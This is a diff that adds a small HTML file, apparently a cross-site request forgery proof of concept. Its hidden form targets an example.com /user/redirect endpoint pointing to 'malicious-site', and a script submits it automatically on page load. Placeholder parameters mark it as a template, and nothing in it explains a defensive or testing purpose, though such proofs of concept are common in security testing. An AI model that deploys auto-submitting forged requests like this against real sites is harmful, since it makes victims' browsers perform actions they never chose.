@@ -1,0 +1,12 @@
+<html>
+<body>
+  <form action="https://example.com/user/redirect?to=malicious-site" method="post" id="csrfForm">
+    <!-- Include any necessary parameters for the /user/redirect endpoint -->
+    <input type="hidden" name="param1" value="value1">
+    <!-- Add other parameters as needed -->
+  </form>
+  <script>
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
